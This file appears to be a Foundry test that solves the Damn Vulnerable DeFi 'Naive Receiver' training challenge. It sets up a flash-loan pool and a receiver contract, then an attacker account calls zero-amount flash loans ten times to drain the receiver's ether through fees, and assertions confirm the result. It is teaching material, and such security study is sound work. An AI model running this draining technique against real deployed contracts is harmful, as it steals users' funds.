pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utilities} from "./utils/Utilities.sol";
import "dvd-v3/naive-receiver/NaiveReceiverLenderPool.sol";
import "dvd-v3/naive-receiver/FlashLoanReceiver.sol";

contract NaiveReceiver is Test {
	uint256 internal constant ETHER_IN_POOL = 1_000e18;
	uint256 internal constant ETHER_IN_RECIEVER = 10e18;

	address payable internal deployer;
	address payable internal attacker;
	address payable internal someUser;

	NaiveReceiverLenderPool internal nrlp;
	FlashLoanReceiver internal flr;

	function setUp() public {
		Utilities utils = new Utilities();
		address payable[] memory users = utils.createUsers(3);
		deployer = users[0];
		vm.label(deployer, "deployer");
		vm.deal(deployer, ETHER_IN_POOL);
		attacker = users[1];
		vm.label(attacker, "attacker");
		someUser = users[2];
		vm.label(someUser, "someUser");
		vm.deal(someUser, ETHER_IN_RECIEVER);

		vm.startPrank(deployer);
		nrlp = new NaiveReceiverLenderPool();
		vm.label(address(nrlp), "Pool");
		(bool sent, bytes memory data) = payable(nrlp).call{value: ETHER_IN_POOL}("");
		require(sent, "Failed to send Ether");
		vm.stopPrank();

		vm.startPrank(someUser);
		flr = new FlashLoanReceiver(address(nrlp));
		vm.label(address(flr), "Receiver");
		(bool sent1, bytes memory data1) = payable(flr).call{value: ETHER_IN_RECIEVER}("");
		require(sent1, "Failed to send Ether");
		vm.stopPrank();

		
	}

	function testExploit() public {
		// flr does not check that flashloan is for more than 0
		// call flashloan 10 times with 0 as entry and the receiver will be empty due to the fee
		vm.startPrank(attacker);
		address ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
		for(uint i=0; i<10; i++) {
			nrlp.flashLoan(flr, ETH, 0, "");
		}
		vm.stopPrank();
		validation();
	}

	function validation() public {
		assertEq(0, address(flr).balance);
		assertEq(ETHER_IN_POOL + ETHER_IN_RECIEVER, address(nrlp).balance);
	}
}
